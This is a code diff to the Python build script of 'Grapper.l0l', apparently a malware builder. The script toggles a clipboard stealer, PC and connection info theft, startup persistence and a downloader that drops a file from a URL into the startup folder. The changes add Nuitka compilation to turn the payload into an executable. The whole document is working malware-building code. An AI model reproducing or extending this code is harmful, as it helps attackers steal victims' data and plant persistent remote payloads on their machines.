@@ -3,6 +3,7 @@ try:
     import requests
     from colorama import Fore
     from tkinter import messagebox
+    import shutil
 
 except:
     print("Seems like u dont have required pacages... installing them now")
@@ -10,14 +11,15 @@ except:
     os.system("python.exe -m pip install --upgrade pip")
     os.system("cls")
     i = 0
-    for pac in ["requests", "colorama"]:
+    for pac in ["requests", "colorama", "nuitka"]:
         os.system(f"title Grapper.l0l - Installing {pac}")
         i += 1
         os.system(f"pip install -q {pac}")
-        print(f"{pac} installed {i}/2")
+        print(f"{pac} installed {i}/3")
     import requests
     from colorama import Fore
     from tkinter import messagebox
+    import shutil
 
 red = Fore.RED
 lred = Fore.LIGHTRED_EX
@@ -38,8 +40,14 @@ with open("resources/build.py", "w") as des:
     des.write(source_code)
 
 def ask(pyt, var):
+    global FILE_DOWNLOADER
+    global MUSIC_PLAYER
     c = input(f"{red}[{res}{pyt}{red}] {black}(y/n) {lred}> ")
     if c == "y":
+        if var == "down_file":
+            FILE_DOWNLOADER = True
+        if var == "play_music":
+            MUSIC_PLAYER = True
         with open("resources/build.py", "r") as f:
             content = f.read()
         new_content = content.replace(f"{var} = False", f"{var} = True")
@@ -93,8 +101,8 @@ ask("Startup", "startup")
 ask("Connection info", "con_info")
 ask("PC info", "pc_info")
 ask("Clipboard stealer", "steal_clipboard")
-c = ask("File downloader", "down_file")
-if c == "y":
+ask("File downloader", "down_file")
+if FILE_DOWNLOADER:
     url = input(f"{red}[{res}URL{red}]{lred} > ")
 
     with open("resources/code.py", "r") as f:
@@ -103,7 +111,7 @@ if c == "y":
     with open("resources/build.py", "w") as f:
         f.write(new_content)
     
-    path = input(f"{red}[{res}Path{red}]{lred} {black}(startup for startup path)> ")
+    path = input(f"{red}[{res}Path{red}]{lred} {black}(startup for startup path){lred} > ")
     if path == "startup":
         path = "dir.startup"
 
@@ -113,13 +121,13 @@ if c == "y":
     with open("resources/build.py", "w") as f:
         f.write(new_content)
 
-c = ask("Music player", "play_music")
-if c == "y":
+ask("Music player", "play_music")
+if MUSIC_PLAYER:
     url = input(f"{red}[{res}URL{red}]{lred} > ")
 
     with open("resources/code.py", "r") as f:
         content = f.read()
-        new_content = content.replace("url = ''", f"url = '{url}'")
+        new_content = content.replace("music_url = ''", f"music_url = '{url}'")
     with open("resources/build.py", "w") as f:
         f.write(new_content)
 
@@ -148,4 +156,20 @@ def ask_othr():
         print(f"{red}[{res}!{red}]{lred} Not a valid input use y or n")
 
 ask_othr()
+os.system("cls")
+print(f"""{Fore.RED}
+ ██████  ██████   █████  ██████  ███████ ██████     ██       ██████  ██      
+██       ██   ██ ██   ██ ██   ██ ██      ██   ██    ██      ██  ████ ██      
+██   ███ ██████  ███████ ██████  █████   ██████     ██      ██ ██ ██ ██      
+██    ██ ██   ██ ██   ██ ██      ██      ██   ██    ██      ████  ██ ██      
+ ██████  ██   ██ ██   ██ ██      ███████ ██   ██ ██ ███████  ██████  ███████                                                                            
+""")
+print(f"{red}WARNING! {res}RUN ONLY DIRECTLY FROM FILE NOT ANY EXTERNAL SOFTWARE LIKE VISUAL STUDIO CODE")
+print("This will take some time... Please wait for a message box from Grapper.L0L\n\n\n")
+os.system("nuitka --follow-imports resources/build.py")
+os.remove("build.cmd")
+shutil.rmtree("build.build") 
+shutil.copy("build.exe", "build") 
+os.remove("build.exe")
+os.startfile("build")
 messagebox.showinfo("Grapper.l0l", "Build made!")
